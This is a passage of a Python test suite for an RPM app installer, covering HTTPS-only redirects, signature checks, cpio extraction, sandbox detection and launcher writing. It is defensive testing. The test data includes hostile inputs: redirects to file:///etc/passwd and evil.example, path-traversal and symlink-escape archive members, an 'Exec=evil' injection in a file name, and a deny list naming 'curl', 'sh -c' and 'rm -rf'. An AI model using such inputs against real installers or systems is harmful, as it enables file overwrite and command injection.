        self.assertCode("package_not_found", vendor.resolve, ENTRY, "x86_64", opener=Opener(routes))

    def test_a_redirect_that_ends_on_http_is_refused(self):
        routes = repo_routes([package("app", "2.0")])
        index_url = f"{BASE}/repodata/repomd.xml"
        routes[index_url] = Response(index_url, routes[index_url], final_url="http://packages.example.com/repomd.xml")
        opener = Opener(routes)
        self.assertCode("insecure_redirect", vendor.resolve, ENTRY, "x86_64", opener=opener)
        self.assertTrue(opener.responses[0].closed)

    def test_http_status_and_missing_files(self):
        self.assertCode("network_error", vendor.resolve, ENTRY, "x86_64", opener=Opener({}))


class Redirects(unittest.TestCase):
    class Body(io.BytesIO):
        pass

    def hop(self, location: str, code: int = 302):
        handler = vendor._HttpsOnlyRedirect()

        class Parent:
            opened = []

            def open(self, request, timeout=None):
                self.opened.append(request.full_url)
                return "followed"

        handler.parent = Parent()
        request = urllib.request.Request("https://packages.example.com/a")
        request.timeout = 5          # OpenerDirector.open() sets this on every request it sends
        body = self.Body(b"moved")
        headers = email.message.Message()
        headers["Location"] = location
        method = getattr(handler, f"http_error_{code}")
        return handler, body, method(request, body, code, "Moved", headers)

    def test_every_hop_must_be_https(self):
        for location in ("http://packages.example.com/b", "ftp://packages.example.com/b", "file:///etc/passwd",
                         "https://user:pw@packages.example.com/b"):
            for code in (301, 302, 303, 307, 308):
                with self.subTest(location=location, code=code), self.assertRaises(vendor.VendorError) as caught:
                    self.hop(location, code)
                self.assertEqual(caught.exception.code, "insecure_redirect")

    def test_the_refused_response_is_closed(self):
        handler = vendor._HttpsOnlyRedirect()
        body = self.Body(b"moved")
        headers = email.message.Message()
        headers["Location"] = "http://evil.example/"
        with self.assertRaises(vendor.VendorError):
            handler.http_error_302(urllib.request.Request("https://packages.example.com/a"), body, 302, "Found", headers)
        self.assertTrue(body.closed)

    def test_an_https_hop_is_followed(self):
        handler, body, result = self.hop("/elsewhere/b.rpm", 302)
        self.assertEqual(result, "followed")
        self.assertEqual(handler.parent.opened[-1], "https://packages.example.com/elsewhere/b.rpm")
        self.assertEqual(handler.max_redirections, vendor.MAX_REDIRECTS)

    def test_the_opener_cannot_speak_anything_but_https(self):
        opener = vendor.https_opener()
        kinds = {type(handler) for handler in opener.handlers}
        for forbidden in (urllib.request.HTTPHandler, urllib.request.FileHandler, urllib.request.FTPHandler,
                          urllib.request.DataHandler):
            self.assertNotIn(forbidden, kinds)
        with self.assertRaises(urllib.error.URLError):
            opener.open("http://127.0.0.1:9/never", timeout=1)


# ── fetch ────────────────────────────────────────────────────────────────────
class Fetch(Home):
    CONTENT = os.urandom(3 * 1024 * 1024 + 17)

    def info(self, content: bytes | None = None, **change) -> dict:
        content = self.CONTENT if content is None else content
        return {"name": "app", "arch": "x86_64", "epoch": 0, "version": "2.0", "release": "1",
                "url": f"{BASE}/app-2.0-1.x86_64.rpm", "sha256": hashlib.sha256(content).hexdigest(),
                "size": len(content), **change}

    def folder(self) -> Path:
        return self.home / ".cache/moos-store/downloads/job"

    def test_exact_size_and_digest(self):
        seen = []
        path = vendor.fetch(self.info(), self.folder(), opener=Opener({f"{BASE}/app-2.0-1.x86_64.rpm": self.CONTENT}),
                            progress=lambda done, total: seen.append((done, total)))
        self.assertEqual(path.read_bytes(), self.CONTENT)
        self.assertEqual(path.name, "app-2.0-1.x86_64.rpm")
        self.assertEqual(stat.S_IMODE(path.stat().st_mode), 0o600)
        self.assertEqual(seen[-1], (len(self.CONTENT), len(self.CONTENT)))
        self.assertEqual(sorted(p.name for p in self.folder().iterdir()), [path.name])

    def assertNothingLeft(self) -> None:
        self.assertEqual(list(self.folder().iterdir()), [])

    def test_larger_than_promised(self):
        info = self.info(self.CONTENT[:-1])          # the metadata promises one byte less than is sent
        routes = {info["url"]: Response(info["url"], self.CONTENT, length=0)}
        self.assertCode("download_too_large", vendor.fetch, info, self.folder(), opener=Opener(routes))
        self.assertNothingLeft()

    def test_announced_larger_than_promised(self):
        info = self.info()
        routes = {info["url"]: Response(info["url"], self.CONTENT, length=len(self.CONTENT) + 1)}
        self.assertCode("download_too_large", vendor.fetch, info, self.folder(), opener=Opener(routes))
        self.assertNothingLeft()

    def test_shorter_than_promised(self):
        info = self.info()
        routes = {info["url"]: Response(info["url"], self.CONTENT[:1000])}
        self.assertCode("download_incomplete", vendor.fetch, info, self.folder(), opener=Opener(routes))
        self.assertNothingLeft()

    def test_digest_mismatch(self):
        info = self.info()
        forged = bytes([self.CONTENT[0] ^ 1]) + self.CONTENT[1:]
        self.assertCode("digest_mismatch", vendor.fetch, info, self.folder(), opener=Opener({info["url"]: forged}))
        self.assertNothingLeft()

    def test_cancel_between_blocks(self):
        info = self.info()
        asked = []
        self.assertCode("cancelled", vendor.fetch, info, self.folder(), opener=Opener({info["url"]: self.CONTENT}),
                        cancelled=lambda: asked.append(1) or len(asked) > 1)
        self.assertNothingLeft()

    def test_redirected_to_http(self):
        info = self.info()
        routes = {info["url"]: Response(info["url"], self.CONTENT, final_url="http://cdn.example/app.rpm")}
        self.assertCode("insecure_redirect", vendor.fetch, info, self.folder(), opener=Opener(routes))
        self.assertNothingLeft()

    def test_no_space(self):
        vendor.SPACE_MARGIN = 1 << 62
        self.assertCode("no_space", vendor.fetch, self.info(), self.folder(), opener=Opener({}))


# ── the publisher's signature ────────────────────────────────────────────────
class Signature(unittest.TestCase):
    PATH = "/home/u/.cache/moos-store/downloads/vendor-app-x/app-2.0-1.x86_64.rpm"

    def verify(self, checksig: str, status: int = 0, keys: str = KEYRING, fingerprint: str = FPR):
        tools = Tools(checksig=checksig, status=status, keys=keys)
        return tools, vendor.verify_signature(self.PATH, fingerprint, run=tools)

    def refused(self, code: str, checksig: str, status: int = 1, **kwargs) -> Tools:
        tools = Tools(checksig=checksig, status=status, **kwargs)
        with self.assertRaises(vendor.VendorError) as caught:
            vendor.verify_signature(self.PATH, FPR, run=tools)
        self.assertEqual(caught.exception.code, code, caught.exception.detail)
        return tools

    def test_the_real_ok_output(self):
        tools, result = self.verify(CHECKSIG_OK)
        self.assertEqual(result, {"fingerprint": FPR.lower(), "algorithm": "RSA/SHA512", "payload_digest": "SHA256"})
        keyring, checksig = tools.calls
        self.assertEqual(keyring[0], [vendor.RPM, "-q", "gpg-pubkey", "--qf",
                                      "%{name}-%{version}-%{release} %{packager}\\n"])
        self.assertEqual(checksig[0], [vendor.RPMKEYS, "--checksig", "--verbose", "--", self.PATH])
        for _argv, kwargs in tools.calls:
            self.assertEqual(kwargs["env"]["LC_ALL"], "C")
            self.assertNotEqual(kwargs["env"].get("HOME"), os.environ.get("HOME"))   # no ~/.rpmmacros
            self.assertNotIn("shell", kwargs)

    def test_the_real_nokey_output(self):
        self.refused("signature_untrusted_key", CHECKSIG_NOKEY)

    def test_the_real_bad_outputs(self):
        self.refused("signature_invalid", CHECKSIG_BAD_PAYLOAD)
        self.refused("signature_invalid", CHECKSIG_BAD_HEADER)

    def test_not_ok_and_nottrusted(self):
        self.refused("signature_invalid", "{path}:\n    V4 RSA/SHA256 Signature, key ID 4a3b4a566c4660e4: NOT OK\n"
                                          "    Payload SHA256 digest: OK\n")
        self.refused("signature_untrusted_key", CHECKSIG_OK.replace(": OK\n    Header SHA256", ": NOTTRUSTED\n    Header SHA256", 1))

    def test_ok_lines_but_a_failing_exit_status(self):
        self.refused("signature_invalid", CHECKSIG_OK, status=1)

    def test_signed_by_another_trusted_key(self):
        other = CHECKSIG_OK.replace(FPR.lower(), OTHER_FPR.lower())
        self.refused("signature_wrong_key", other, status=0)

    def test_long_key_id_is_proof_short_key_id_is_not(self):
        long_id = ("{path}:\n    Header V4 RSA/SHA256 Signature, key ID 4a3b4a566c4660e4: OK\n"
                   "    Header SHA256 digest: OK\n    Payload SHA256 digest: OK\n")
        _tools, result = self.verify(long_id)
        self.assertEqual(result["algorithm"], "RSA/SHA256")
        self.refused("signature_wrong_key", long_id.replace("4a3b4a566c4660e4", "6c4660e4"), status=0)

    def test_weak_algorithms(self):
        sha1 = CHECKSIG_OK.replace("RSA/SHA512", "RSA/SHA1")
        self.refused("signature_weak", sha1, status=0)
        dsa = CHECKSIG_OK.replace("RSA/SHA512", "DSA/SHA256")
        self.refused("signature_weak", dsa, status=0)
        # A legacy SHA-1 signature beside a strong one by the same key is not a reason to refuse.
        both = CHECKSIG_OK + "    V4 RSA/SHA1 Signature, key ID 4a3b4a566c4660e4: OK\n"
        self.assertEqual(self.verify(both)[1]["algorithm"], "RSA/SHA512")

    def test_unsigned_package(self):
        self.refused("signature_missing", "{path}:\n    Header SHA256 digest: OK\n    Payload SHA256 digest: OK\n",
                     status=0)

    def test_payload_digest_required(self):
        self.refused("payload_unverified", CHECKSIG_OK.replace("    Payload SHA256 digest: OK\n", ""), status=0)

    def test_key_must_be_in_the_keyring_first(self):
        tools = self.refused("key_not_installed", CHECKSIG_OK, status=0, keys=KEYRING_WITHOUT)
        self.assertEqual(len(tools.calls), 1, "rpmkeys must not even run without the publisher key")
        legacy = Tools(keys="gpg-pubkey-6c4660e4-6a72a455 Codex Linux Repository\n")
        self.assertTrue(vendor.key_installed(FPR, run=legacy))   # rpm before 6 names keys by 8 digits

    def test_missing_tools(self):
        def missing(argv, **_kwargs):
            raise FileNotFoundError(argv[0])
        with self.assertRaises(vendor.VendorError) as caught:
            vendor.verify_signature(self.PATH, FPR, run=missing)
        self.assertEqual(caught.exception.code, "tool_missing")

    def test_signed_header_must_match_the_metadata(self):
        info = {"name": "app", "epoch": 0, "version": "2.0", "release": "1", "arch": "x86_64"}
        self.assertEqual(vendor.check_header(self.PATH, info, run=Tools())["payload_format"], "cpio")
        for change in ({"version": "1.0"}, {"release": "2"}, {"arch": "aarch64"}, {"name": "app2"}, {"epoch": 1}):
            with self.subTest(change=change), self.assertRaises(vendor.VendorError) as caught:
                vendor.check_header(self.PATH, {**info, **change}, run=Tools())
            self.assertEqual(caught.exception.code, "header_mismatch")
        with self.assertRaises(vendor.VendorError) as caught:
            vendor.check_header(self.PATH, info, run=Tools(header=("app", "0", "2.0", "1", "x86_64", "drpm")))
        self.assertEqual(caught.exception.code, "unsupported_archive")


# ── the payload ──────────────────────────────────────────────────────────────
class Payload(Home):
    def write(self, data: bytes, name: str = "payload.cpio") -> Path:
        path = self.base / name
        path.write_bytes(data)
        return path

    def target(self) -> Path:
        return self.base / "work" / "app"

    def extract(self, data: bytes, **kwargs) -> vendor.Extracted:
        self.target().parent.mkdir(exist_ok=True)
        return vendor.extract_cpio(self.write(data), "/usr/lib/app", self.target(), **kwargs)

    def test_only_the_app_folder_is_written(self):
        archive = newc([
            {"name": "./etc/yum.repos.d/app.repo", "mode": REG, "data": b"[app]\n"},
            {"name": "./usr/bin/app", "mode": LNK, "data": b"../lib/app/launcher"},
            {"name": "./usr/lib/app", "mode": DIR},
            {"name": "./usr/lib/app/App", "mode": EXE, "data": CHROMIUM_ELF},
            {"name": "./usr/lib/app/launcher", "mode": EXE, "data": b"#!/bin/sh\nexec ./App\n"},
            {"name": "./usr/lib/app/chrome-sandbox", "mode": 0o104755, "data": b"\x7fELF"},
            {"name": "./usr/lib/app/setgid-tool", "mode": 0o102775, "data": b"\x7fELF"},
            {"name": "./usr/lib/app/world-writable", "mode": 0o100666, "data": b"x"},
            {"name": "./usr/lib/app/lib/libx.so.1", "mode": REG, "data": b"lib"},
            {"name": "./usr/lib/app/lib/libx.so", "mode": LNK, "data": b"libx.so.1"},
            {"name": "./usr/lib/app/absolute", "mode": LNK, "data": b"/usr/lib/app/lib/libx.so.1"},
            {"name": "./usr/lib/app/data/a", "mode": REG, "nlink": 2, "ino": 77},
            {"name": "./usr/lib/app/data/b", "mode": REG, "nlink": 2, "ino": 77, "data": b"shared"},
            {"name": "./usr/share/applications/app.desktop", "mode": REG, "data": VENDOR_DESKTOP},
            {"name": "./usr/share/pixmaps/app.png", "mode": REG, "data": PNG},
        ])
        result = self.extract(archive, extras=["/usr/share/applications/app.desktop", "/usr/share/pixmaps/app.png",
                                                "/usr/bin/app"])
        tree = self.target()
        self.assertEqual(sorted(p.name for p in tree.iterdir()),
                         ["App", "absolute", "chrome-sandbox", "data", "launcher", "lib", "setgid-tool", "world-writable"])
        self.assertEqual(stat.S_IMODE((tree / "App").stat().st_mode), 0o755)
        self.assertEqual(stat.S_IMODE((tree / "chrome-sandbox").stat().st_mode), 0o755)   # setuid gone
        self.assertEqual(stat.S_IMODE((tree / "setgid-tool").stat().st_mode), 0o755)
        self.assertEqual(stat.S_IMODE((tree / "world-writable").stat().st_mode), 0o644)
        self.assertEqual(sorted(result.stripped), ["chrome-sandbox", "setgid-tool"])
        self.assertEqual(os.readlink(tree / "lib/libx.so"), "libx.so.1")
        self.assertEqual(os.readlink(tree / "absolute"), "lib/libx.so.1")              # rewritten relative
        self.assertEqual((tree / "data/a").read_bytes(), b"shared")
        self.assertEqual((tree / "data/a").stat().st_ino, (tree / "data/b").stat().st_ino)
        self.assertEqual(result.extras["/usr/share/applications/app.desktop"], VENDOR_DESKTOP)
        self.assertEqual(result.extras["/usr/share/pixmaps/app.png"], PNG)
        self.assertEqual(result.extras["/usr/bin/app"], b"#!/bin/sh\nexec ./App\n")   # a link, read in the tree
        self.assertEqual(result.skipped, 4)
        self.assertEqual(sorted(p.name for p in self.target().parent.iterdir()), ["app"])
        self.assertOutsideUntouched()

    def test_hostile_members(self):
        app = {"name": "./usr/lib/app", "mode": DIR}
        cases = {
            "absolute name": ("unsafe_archive", [app, {"name": "/usr/lib/app/x", "mode": REG, "data": b"x"}]),
            # From base/work/app, `../../OUTSIDE` IS this test's canary folder: a reader that
            # followed the name would write there, and assertOutsideUntouched() would see it.
            "dotdot inside": ("unsafe_archive", [app, {"name": "./usr/lib/app/../../OUTSIDE/x", "mode": REG,
                                                      "data": b"escaped"}]),
            "dotdot first": ("unsafe_archive", [{"name": "../OUTSIDE/x", "mode": REG, "data": b"x"}]),
            "character device": ("unsafe_archive", [app, {"name": "./usr/lib/app/tty", "mode": 0o020644}]),
            "block device": ("unsafe_archive", [app, {"name": "./usr/lib/app/sda", "mode": 0o060644}]),
            "pipe": ("unsafe_archive", [app, {"name": "./usr/lib/app/pipe", "mode": 0o010644}]),
            "device outside": ("unsafe_archive", [{"name": "./dev/null", "mode": 0o020666}, app]),
            "relative link out": ("unsafe_archive", [app, {"name": "./usr/lib/app/x", "mode": LNK,
                                                          "data": b"../../../../OUTSIDE/canary"}]),
            "absolute link out": ("unsafe_archive", [app, {"name": "./usr/lib/app/x", "mode": LNK,
                                                          "data": b"/etc/passwd"}]),
            "sibling with same prefix": ("unsafe_archive", [app, {"name": "./usr/lib/app/x", "mode": LNK,
                                                                 "data": b"../app2/secret"}]),
            "control character": ("unsafe_archive", [app, {"name": "./usr/lib/app/a\nExec=evil", "mode": REG}]),
            "not utf-8": ("unsafe_archive", [app, {"name": b"./usr/lib/app/\xff", "mode": REG}]),
            "duplicate": ("unsafe_archive", [app, {"name": "./usr/lib/app/x", "mode": REG, "data": b"1"},
                                            {"name": "./usr/lib/app/x", "mode": REG, "data": b"2"}]),
            "through a link": ("unsafe_archive", [app, {"name": "./usr/lib/app/dir", "mode": LNK, "data": b"."},
                                                 {"name": "./usr/lib/app/dir/x", "mode": REG, "data": b"x"}]),
            "app folder is a link": ("unsafe_archive", [{"name": "./usr/lib/app", "mode": LNK,
                                                        "data": str(self.outside).encode()}]),
            "app folder is a file": ("unsafe_archive", [{"name": "./usr/lib/app", "mode": REG, "data": b"x"}]),
            "folder with data": ("archive_invalid", [{"name": "./usr/lib/app", "mode": DIR, "data": b"x"}]),
            "large file format": ("unsupported_archive", [{"name": "./usr/lib/app", "mode": DIR, "magic": b"07070X"}]),
            "wrong magic": ("archive_invalid", [{"name": "./usr/lib/app", "mode": DIR, "magic": b"123456"}]),
            "nothing for the app": ("install_root_missing", [{"name": "./usr/bin/app", "mode": REG, "data": b"x"}]),
        }
        for label, (code, entries) in cases.items():
            with self.subTest(label):
                self.assertCode(code, self.extract, newc(entries))
                self.assertFalse(self.target().exists(), "a refused payload leaves nothing behind")
                self.assertOutsideUntouched()

    def test_truncation_and_trailers(self):
        good = newc([{"name": "./usr/lib/app", "mode": DIR},
                     {"name": "./usr/lib/app/App", "mode": EXE, "data": b"x" * 5000}])
        self.assertEqual(self.extract(good).files, 1)
        cases = {
            "cut in the data": good[:400],
            "cut in a header": good[:150],
            "no trailer": newc([{"name": "./usr/lib/app", "mode": DIR}], trailer=False),
            "junk after the trailer": good + b"\x01",
            "a second archive after the trailer": good + newc([{"name": "./usr/lib/app/x", "mode": REG}]),
        }
        for label, data in cases.items():
            with self.subTest(label):
                shutil.rmtree(self.target(), ignore_errors=True)
                self.assertCode("archive_invalid", self.extract, data)
                self.assertFalse(self.target().exists())
        shutil.rmtree(self.target(), ignore_errors=True)
        padded = good + b"\0" * 9316                         # what the real ChatGPT payload carries
        self.assertEqual(self.extract(padded).files, 1)

    def test_budgets(self):
        entries = [{"name": "./usr/lib/app", "mode": DIR}] + [
            {"name": f"./usr/lib/app/f{index}", "mode": REG, "data": b"x" * 10} for index in range(6)]
        vendor.MAX_TREE_FILES = 4
        self.assertCode("archive_bomb", self.extract, newc(entries))
        vendor.MAX_TREE_FILES = self.saved_constants["MAX_TREE_FILES"]
        vendor.MAX_TREE_BYTES = 35
        self.assertCode("archive_bomb", self.extract, newc(entries))
        vendor.MAX_TREE_BYTES = self.saved_constants["MAX_TREE_BYTES"]
        vendor.RATIO_FLOOR, vendor.MAX_RATIO = 20, 2
        self.assertCode("archive_bomb", self.extract, newc(entries), compressed_size=5)
        self.assertFalse(self.target().exists())

    def test_cancel(self):
        archive = newc([{"name": "./usr/lib/app", "mode": DIR},
                        {"name": "./usr/lib/app/App", "mode": EXE, "data": b"x" * (3 * 1024 * 1024)}])
        self.assertCode("cancelled", self.extract, archive, cancelled=lambda: True)
        self.assertFalse(self.target().exists())

    def fake_rpm2cpio(self, script: str) -> None:
        tool = self.base / "rpm2cpio"
        tool.write_text("#!/bin/sh\n" + script)
        tool.chmod(0o755)
        vendor.RPM2CPIO = str(tool)

    def test_the_producer_and_the_reader_must_both_succeed(self):
        package = self.write(b"rpm bytes", "app.rpm")
        self.target().parent.mkdir(exist_ok=True)
        good = newc([{"name": "./usr/lib/app", "mode": DIR}, {"name": "./usr/lib/app/App", "mode": EXE, "data": b"x"}])
        payload = self.write(good, "good.cpio")
        # The producer prints a complete, valid archive and THEN fails: still refused.
        self.fake_rpm2cpio(f'cat "{payload}"\necho "error: payload corrupt" >&2\nexit 3\n')
        error = self.assertCode("extract_failed", vendor.extract, package, "/usr/lib/app", self.target())
        self.assertIn("exited 3", error.detail)
        self.assertIn("payload corrupt", error.detail)
        # The producer succeeds but its archive is cut short: the reader refuses.
        truncated = self.write(good[:200], "cut.cpio")
        self.fake_rpm2cpio(f'cat "{truncated}"\n')
        self.assertCode("archive_invalid", vendor.extract, package, "/usr/lib/app", self.target())
        # Both succeed.
        self.fake_rpm2cpio(f'cat "{payload}"\n')
        self.assertEqual(vendor.extract(package, "/usr/lib/app", self.target()).files, 1)
        leftovers = [p.name for p in self.target().parent.iterdir() if p.name.endswith(".cpio")]
        self.assertEqual(leftovers, [], "the private payload file is always removed")

    def test_a_producer_that_expands_past_its_budget_is_stopped(self):
        package = self.write(b"tiny", "app.rpm")
        self.target().parent.mkdir(exist_ok=True)
        vendor.MAX_RATIO = 1
        self.fake_rpm2cpio("head -c 3000000 /dev/zero\nexec sleep 5\n")
        self.assertCode("archive_bomb", vendor.extract, package, "/usr/lib/app", self.target())

    def test_missing_producer(self):
        vendor.RPM2CPIO = str(self.base / "absent-rpm2cpio")
        package = self.write(b"rpm", "app.rpm")
        self.target().parent.mkdir(exist_ok=True)
        self.assertCode("tool_missing", vendor.extract, package, "/usr/lib/app", self.target())


# ── does the program start its own sandbox? ──────────────────────────────────
class Sandbox(Home):
    def tree(self, name: str = "tree", **overrides: bytes) -> Path:
        payload = self.base / f"{name}.cpio"
        payload.write_bytes(app_payload(**overrides))
        target = self.base / name
        vendor.extract_cpio(payload, "/usr/lib/app", target)
        return target

    def test_the_user_namespace_sandbox(self):
        report = vendor.sandbox_report(self.tree(), "App", proc_sys=self.proc_sys())
        self.assertEqual(report["mode"], "namespace")
        self.assertEqual(report["helper"], "inert")             # shipped setuid, extracted without the bit
        self.assertEqual(report["setuid_files"], [])
        self.assertTrue(report["chromium"])
        self.assertEqual(report["switches"], [])                 # a bundled tool's --no-sandbox is not the app's

    def test_no_user_namespaces_means_no_sandbox(self):
        tree = self.tree()
        for proc in (self.proc_sys("0"), self.proc_sys(clone="0"), self.proc_sys(apparmor="1")):
            with self.subTest(proc=proc.name):
                self.assertEqual(vendor.sandbox_report(tree, "App", proc_sys=proc)["mode"], "unavailable")

    def test_switches_that_turn_the_sandbox_off(self):
        launcher = self.tree("launcher", launcher=b"#!/bin/sh\nexec ./App --no-sandbox \"$@\"\n")
        self.assertEqual(vendor.sandbox_report(launcher, "App", proc_sys=self.proc_sys())["mode"], "off")
        bundle = self.tree("bundle", main=b"app.commandLine.appendSwitch('no-sandbox');")
        report = vendor.sandbox_report(bundle, "App", proc_sys=self.proc_sys())
        self.assertEqual((report["mode"], report["switches"]), ("off", ["--no-sandbox"]))
        namespace_off = self.tree("namespace", main=b'e.commandLine.appendSwitch("disable-namespace-sandbox")')
        self.assertEqual(vendor.sandbox_report(namespace_off, "App", proc_sys=self.proc_sys())["mode"], "unavailable")

    def test_not_a_chromium_program(self):
        tree = self.tree(app=b"\x7fELF\x02\x01\x01" + b"\0" * 64)
        self.assertEqual(vendor.sandbox_report(tree, "App", proc_sys=self.proc_sys())["mode"], "not-chromium")

    def test_the_program_must_be_inside_and_runnable(self):
        tree = self.tree()
        for exec_rel in ("missing", "resources/app.asar", "resources"):
            with self.subTest(exec_rel=exec_rel):
                self.assertCode("nothing_to_launch", vendor.sandbox_report, tree, exec_rel, proc_sys=self.proc_sys())
        (tree / "escape").symlink_to(self.outside / "canary")
        self.assertCode("nothing_to_launch", vendor.sandbox_report, tree, "escape", proc_sys=self.proc_sys())


# ── launcher, records, remove ────────────────────────────────────────────────
class Launchers(Home):
    def applications(self) -> Path:
        return self.home / ".local/share/applications"

    def test_the_launcher_is_moos_s_own(self):
        fields = vendor.desktop_fields(VENDOR_DESKTOP, "app")
        self.assertEqual(fields, {"name": "App Studio", "comment": "Talk to it", "categories": "Utility;Development;",
                                  "icon_name": "app"})
        path = vendor.write_launcher("app", exec_path="/home/u/.local/share/moos/vendor/app/app/App",
                                     name=fields["name"], comment=fields["comment"], icon="/home/u/icon.png",
                                     categories=fields["categories"], wm_class="App", schemes=["appx"])
        self.assertEqual(path.name, "org.moos.vendor.app.desktop")
        text = path.read_text()
        self.assertIn('Exec="/home/u/.local/share/moos/vendor/app/app/App" %U\n', text)
        self.assertIn("TryExec=/home/u/.local/share/moos/vendor/app/app/App\n", text)
        self.assertIn("StartupWMClass=App\n", text)
        self.assertIn("MimeType=x-scheme-handler/appx;\n", text)
        self.assertIn("X-MoOS-Vendor=app\n", text)
        for foreign in ("sh -c", "curl", "TryExec=/bin/sh", "https;", "Wipe", "rm -rf", "X-Evil", "Desktop Action"):
            self.assertNotIn(foreign, text)
        self.assertIsNone(re.search("[\x00-\x08\x0b-\x1f\x7f]", text))
        self.assertNotIn(RLO, text)
        self.assertEqual(stat.S_IMODE(path.stat().st_mode), 0o644)

    def test_a_launcher_moos_did_not_write_is_never_replaced(self):
        self.applications().mkdir(parents=True)
        foreign = self.applications() / "org.moos.vendor.app.desktop"
        foreign.write_text("[Desktop Entry]\nName=Mine\nExec=mine\n")
        self.assertCode("name_taken", vendor.write_launcher, "app", exec_path="/x/App", name="App")
        self.assertEqual(foreign.read_text(), "[Desktop Entry]\nName=Mine\nExec=mine\n")
        foreign.unlink()
        foreign.symlink_to(self.outside / "canary")
        self.assertCode("name_taken", vendor.write_launcher, "app", exec_path="/x/App", name="App")
        self.assertOutsideUntouched()

    def test_home_paths_that_cannot_be_quoted_are_refused(self):
        for exec_path in ('/home/a"b/App', "/home/$USER/App", "/home/a`b`/App", "/home/a\\b/App", "/home/a\nb/App"):
            with self.subTest(exec_path=exec_path):
                self.assertCode("unsafe_path", vendor.launcher_text, "app", exec_path=exec_path, name="App")
        self.assertIn('Exec="/home/100%%/App" %U', vendor.launcher_text("app", exec_path="/home/100%/App", name="A"))

    def test_reserved_schemes_and_bad_ids(self):
        self.assertCode("bad_entry", vendor.launcher_text, "app", exec_path="/x", name="A", schemes=["https"])
        for bad in ("../app", "App", "a", "a/b", "a.b"):
            with self.subTest(bad=bad):
                self.assertCode("bad_id", vendor.launcher_path, bad)


class Records(Home):
    def apps(self) -> Path:
        return self.home / "Applications"

    def records(self) -> Path:
        return self.home / ".local/share/moos/vendor"

    def install_files(self, app_id: str = "app") -> None:
        tree = self.apps() / app_id
        tree.mkdir(parents=True)
        (tree / "App").write_bytes(b"\x7fELF")
        (tree / ".moos-vendor").write_text(app_id + "\n")
        vendor.write_launcher(app_id, exec_path=str(tree / "App"), name="App")
        record = {"schema": 1, "id": app_id, "kind": "vendor-rpm", "epoch": 0, "version": "2.0", "release": "1"}
        self.records().mkdir(parents=True, exist_ok=True)
        (self.records() / f"{app_id}.json").write_text(json.dumps(record))

    def test_installed_and_updates(self):
        self.assertIsNone(vendor.installed("app"))
        self.assertFalse(vendor.update_available("app", "9.9-9"))
        self.install_files()
        self.assertEqual(vendor.installed("app")["version"], "2.0")
        self.assertTrue(vendor.update_available("app", "2.0-2"))
        self.assertTrue(vendor.update_available("app", {"epoch": 1, "version": "0.1", "release": "1"}))
        self.assertTrue(vendor.update_available("app", "2.0^git1-1"))
        self.assertFalse(vendor.update_available("app", "2.0-1"))
        self.assertFalse(vendor.update_available("app", "2.0~rc9-9"))
        self.assertFalse(vendor.update_available("app", "1.9-99"))
        (self.records() / "app.json").write_text("{not json")
        self.assertIsNone(vendor.installed("app"))

    def test_intact_needs_the_record_the_launcher_and_the_marked_folder(self):
        self.assertFalse(vendor.intact("app"))
        self.install_files()
        self.assertTrue(vendor.intact("app"))
        launcher = self.home / ".local/share/applications/org.moos.vendor.app.desktop"
        saved = launcher.read_bytes()
        launcher.write_text("[Desktop Entry]\nName=Not ours\n")
        self.assertFalse(vendor.intact("app"), "a launcher MoOS did not write counted")
        launcher.write_bytes(saved)
        marker = self.apps() / "app/.moos-vendor"
        marker.unlink()
        (self.outside / "marker").write_text("app\n")
        marker.symlink_to(self.outside / "marker")
        self.assertFalse(vendor.intact("app"), "a marker reached through a link counted")
        marker.unlink()
        marker.write_text("app\n")
        self.assertTrue(vendor.intact("app"))
        (self.records() / "app.json").unlink()
        self.assertFalse(vendor.intact("app"))

    def test_remove_takes_only_what_carries_the_marker(self):
        self.install_files()
        applications = self.home / ".local/share/applications"
        mine = applications / "chatgpt.desktop"                 # the owner's own hand-made launcher
        mine.write_text("[Desktop Entry]\nName=ChatGPT\nExec=/home/u/.local/share/chatgpt/ChatGPT\n")
        dropped = self.apps() / "photocraft"                    # an App Drop app beside it
        dropped.mkdir()
        (dropped / "AppRun").write_text("#!/bin/sh\n")
        self.assertTrue(vendor.remove("app"))
        self.assertFalse((applications / "org.moos.vendor.app.desktop").exists())
        self.assertFalse((self.apps() / "app").exists())
        self.assertFalse((self.records() / "app.json").exists())
        self.assertTrue(mine.exists())
        self.assertTrue((dropped / "AppRun").exists())
        self.assertFalse(vendor.remove("app"))

    def test_remove_leaves_unmarked_files_and_never_follows_links(self):
        self.apps().mkdir(parents=True)
        (self.outside / ".moos-vendor").write_text("app\n")       # a marker reached only THROUGH a link
        (self.apps() / "app").symlink_to(self.outside, target_is_directory=True)
        applications = self.home / ".local/share/applications"
        applications.mkdir(parents=True)
        (applications / "org.moos.vendor.app.desktop").write_text("[Desktop Entry]\nName=Not ours\n")
        (applications / "org.moos.vendor.other.desktop").symlink_to(self.outside / "canary")
        unmarked = self.apps() / "other"                         # e.g. an App Drop app called "other"
        (unmarked / "bin").mkdir(parents=True)
        self.assertFalse(vendor.remove("app"))
        self.assertFalse(vendor.remove("other"))
        self.assertTrue((self.apps() / "app").is_symlink())
        self.assertTrue((applications / "org.moos.vendor.app.desktop").exists())
        self.assertTrue((applications / "org.moos.vendor.other.desktop").is_symlink())
        self.assertTrue((unmarked / "bin").is_dir())
        self.assertEqual(sorted(p.name for p in self.outside.iterdir()), [".moos-vendor", "canary"])


# ── install / update, end to end with the image's tools replaced ─────────────
class Install(Home):
    def serve(self, version: str, payload: bytes, package_bytes: bytes | None = None) -> tuple[Opener, dict]:
        content = package_bytes or (b"rpm:" + version.encode() + os.urandom(64))
        packages = [package("app", "1.0"), package("app", version, content=content)]
        routes = repo_routes(packages)
        routes[f"{BASE}/app-{version}-1.x86_64.rpm"] = content
        self.payload = payload
        return Opener(routes), {"version": version}

    def convert(self, rpm: Path, cpio: Path, cancelled, limit: int) -> None:
        cpio.write_bytes(self.payload)

    def install(self, version: str, payload: bytes, *, tools: Tools | None = None, **kwargs):
        opener, _ = self.serve(version, payload)
        stages = []
        self.reports = []
        tools = tools or Tools(header=("app", "0", version, "1", "x86_64", "cpio"))

        def progress(stage, percent):
            stages.append(stage)
            self.reports.append((stage, percent))

        record = vendor.install("app", ENTRY, arch="x86_64", opener=opener, run=tools, convert=self.convert,
                                refresh_menu=False, proc_sys=self.proc_sys(), progress=progress, **kwargs)
        return record, stages, opener

    def apps(self) -> Path:
        return self.home / "Applications"

    def records(self) -> Path:
        return self.home / ".local/share/moos/vendor"

    def launcher(self) -> Path:
        return self.home / ".local/share/applications/org.moos.vendor.app.desktop"

    def assertClean(self, *, installed: bool = True) -> None:
        self.assertEqual(sorted(p.name for p in self.apps().iterdir()), ["app"] if installed else [],
